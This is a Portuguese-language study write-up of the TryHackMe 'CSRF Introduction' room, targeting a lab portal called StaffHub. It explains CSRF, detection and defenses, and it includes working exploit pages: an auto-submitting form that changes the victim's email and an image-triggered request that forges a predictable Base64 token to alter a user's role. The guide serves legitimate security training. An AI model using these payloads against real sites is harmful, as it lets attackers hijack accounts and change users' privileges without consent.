# 🛡️ Resumão CSRF Introduction — Anotações TryHackMe

> Sala do módulo **Web Application Vulnerabilities I**. Cobre CSRF (Cross-Site Request Forgery) de ponta a ponta: conceito, por que funciona, detecção, exploração sem token, exploração com token fraco e boas práticas. Alvo: portal **StaffHub**.
>
> ⚠️ **Use apenas em laboratórios (TryHackMe, HackTheBox, PortSwigger Academy, VMs próprias) ou em sistemas para os quais você tenha autorização por escrito.**

---

## 📑 Índice

1. [O que é CSRF](#1-o-que-é-csrf)
2. [Por que funciona + as 3 condições](#2-por-que-funciona--as-3-condições)
3. [Como encontrar (detecção)](#3-como-encontrar-detecção)
4. [Exploração 1: form HTML (sem token)](#4-exploração-1-form-html-sem-token)
5. [Exploração 2: token fraco + img/onmouseover](#5-exploração-2-token-fraco--imgonmouseover)
6. [Vetores de disparo (exemplos de payload)](#6-vetores-de-disparo-exemplos-de-payload)
7. [Setup no Kali (fora do AttackBox)](#7-setup-no-kali-fora-do-attackbox)
8. [Defesa / remediação](#8-defesa--remediação)
9. [Checklist do pentester](#9-checklist-do-pentester)
10. [Erros comuns](#10-erros-comuns)

---

## 1. O que é CSRF

O atacante **engana o navegador da vítima** pra mandar uma requisição a um site onde ela **já está logada**. Como o navegador anexa o **cookie de sessão automaticamente**, o servidor acha que foi a vítima que pediu.

```
1. User Logs In      → navegador guarda o cookie de sessão
2. Visits Malicious  → vítima abre página maliciosa com requisição "armada"
   Site
3. Request Sent      → navegador dispara a requisição ao alvo + cookie
                       → servidor processa como legítima
```

**O que CSRF NÃO é:**
- Não rouba credenciais (≠ phishing)
- Não injeta script (≠ XSS)
- Não lê dados — o atacante é **cego à resposta**, só **dispara uma ação**

---

## 2. Por que funciona + as 3 condições

**Não é bug do navegador** — ele faz o que foi projetado (anexar cookie a toda requisição do domínio, não importa a origem). O erro é a **aplicação confiar demais** ("veio com meu cookie = foi meu usuário").

**As 3 condições (decore o tripé):**

| # | Condição | Em miúdos |
|---|---|---|
| 1 | **Vítima autenticada** | Sessão ativa no alvo |
| 2 | **Ação que muda estado** | Trocar email/senha/role/transação (não "só ler") |
| 3 | **Sem verificação de origem** | Sem token CSRF, sem checar Origin/Referer |

> Faltou uma das 3 → ataque falha. A **defesa** (token) ataca a condição 3.

---

## 3. Como encontrar (detecção)

A pergunta-chave:
> *"Essa ação pode ser disparada sem verificar que o pedido veio mesmo do usuário?"*

**Mito GET vs POST (cai na prova):** usar POST **não** protege. Ambos são exploráveis se não há verificação de origem.
- **GET** → explorável por link ou `<img>`
- **POST** → explorável por `<form>` auto-submetido

Features tipicamente vulneráveis: trocar email, senha, role, preferências, pagamento.

---

## 4. Exploração 1: form HTML (sem token)

**Cenário:** o StaffHub troca email com um POST pra `update_email.php` com **só o parâmetro `email`**, sem token. As 3 condições batem → vulnerável.

**Página maliciosa (`settings.html`):**
```html
<html>
<body>
<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>
<script>
document.getElementById("attack").submit();      // auto-submete, vítima não clica
setTimeout(function() {                            // redireciona pra disfarçar
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>
</body>
</html>
```

**Como funciona:** a vítima (logada) abre a página → o JS submete o form escondido → o navegador manda o POST **com o cookie de sessão** → o servidor troca o email.

---

## 5. Exploração 2: token fraco + img/onmouseover

**Cenário:** o "Update Role" é protegido por `csrf_token`... mas o token é só o **role em Base64**:

```
YWRtaW4=  →  decode Base64  →  admin
```

Token **previsível** = proteção inútil. O atacante entende como é gerado e **reproduz** sozinho.

> Confirme o decode no **Decoder do Burp**: `YWRtaW4=` → Decode as Base64 → `admin`.

**A forma de ver o token:** Inspector do navegador no form de Role Management:
```html
<form action="update_role.php" method="GET">
    <input type="hidden" name="csrf_token" value="YWRtaW4=">
```
Note o **GET** → dá pra disparar com `<img>`.

**Página maliciosa (`role.html`):**
```html
<html>
<body>
<h2>StaffHub Internal Notice</h2>
<p>Move your mouse over the banner below to load the latest role updates.</p>
<img src="http://staffhub.thm:8080/one.png"
onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
width="400">
</body>
</html>
```

**Como funciona:** a vítima passa o mouse na imagem → `onmouseover` dispara o GET pra `update_role.php?role=staff&csrf_token=YWRtaW4=` + cookie → role muda **admin → staff**.

> Como calcular o token: ele é o Base64 do **role atual** da vítima. Logado como admin → token = Base64("admin") = `YWRtaW4=`. Em bash: `echo -n admin | base64`.

---

## 6. Vetores de disparo (exemplos de payload)

| Método do alvo | Vetor | Exemplo |
|---|---|---|
| **GET** | Link | `<a href="http://alvo/update?x=1">Clique</a>` |
| **GET** | Imagem (auto) | `<img src="http://alvo/update?x=1">` |
| **GET** | Evento JS | `<img src="..." onmouseover="window.location='http://alvo/update?x=1'">` |
| **POST** | Form auto-submit | `<form action="http://alvo/update" method="POST">...<script>form.submit()</script>` |

> `<img>` com `src` dispara **sozinho** ao carregar a página (nem precisa de mouse). O `onmouseover` é só pra parecer mais inocente ("passe o mouse no banner").

---

## 7. Setup no Kali (fora do AttackBox)

```bash
# 1. VPN conectada (interface tun0) + resolver o domínio
echo "IP_DO_ALVO staffhub.thm" | sudo tee -a /etc/hosts

# 2. criar a pasta e o exploit (use cat, mais confiável que o nano)
mkdir -p /root/csrf
cat > /root/csrf/settings.html << 'EOF'
...conteúdo do exploit...
EOF

# 3. subir o servidor DE DENTRO da pasta do exploit
cd /root/csrf
python3 -m http.server 8000

# 4. testar (em outro terminal)
curl -s http://127.0.0.1:8000/settings.html    # tem que vir o HTML, não 404

# 5. disparar no Firefox (logado no StaffHub, MESMA aba):
#    http://SEU_IP_tun0:8000/settings.html
```

**Lições de ambiente (os perrengues reais):**
- ❗ `~` muda por usuário: `/home/kali` (kali) vs `/root` (root). Não misture.
- ❗ `python3 -m http.server` serve a pasta **de onde foi iniciado** → `cd` antes.
- ❗ O exploit mora no **SEU IP** (atacante); o `action`/`src` do form aponta pro **domínio do alvo**. Não confunda.
- ❗ Tem que estar **logado no alvo na mesma aba/navegador** — é o que simula a vítima.

---

## 8. Defesa / remediação

| Defesa | O que faz |
|---|---|
| **Token CSRF forte** | Único, imprevisível (aleatório), amarrado à sessão. Gerado no servidor (`random_bytes(32)`), comparado a cada POST |
| **SameSite cookie** | `SameSite=Strict/Lax` → navegador não manda o cookie em requisições cross-site |
| **Checar Origin/Referer** | Servidor rejeita requisição que não veio do próprio site |
| **Reautenticação** | Pedir senha de novo em ações críticas (trocar senha, pagamento) |

> ⚠️ **Token fraco é PIOR que nada** — cria falsa sensação de segurança. Base64 **não é criptografia**, qualquer um reverte. Token tem que ser: **único + imprevisível + amarrado à sessão**.

---

## 9. Checklist do pentester

1. **Foco em state-changing** — priorize o que muda dados (senha, email, role, $$).
2. **Inspecionar o token** — não tem? estático? previsível? → vulnerável.
3. **Analisar o método** — ação sensível em GET = mais fácil (img/link).
4. **Testar fora do app** — reproduza a requisição de uma página externa. Funcionou? vulnerável.
5. **Observar cookies** — auth só por cookie de sessão, sem checar origem? → CSRF possível.

---

## 10. Erros comuns

- ❌ Achar que **POST protege** contra CSRF (não protege).
- ❌ Confundir CSRF com XSS (CSRF não injeta script, é cego à resposta).
- ❌ No Kali, misturar usuário `kali`/`root` → caminhos `~` quebram.
- ❌ Rodar o `http.server` na pasta errada → 404 no exploit.
- ❌ Hospedar o exploit no IP do alvo em vez do seu → "Unable to connect".
- ❌ Disparar o exploit **sem estar logado** no alvo → requisição sem cookie, nada acontece.
- ❌ Achar que Base64 é "token seguro" (é só codificação, reversível).
- ❌ Testar sites sem autorização.

---

*Módulo: Web Application Vulnerabilities I — CSRF Introduction.*
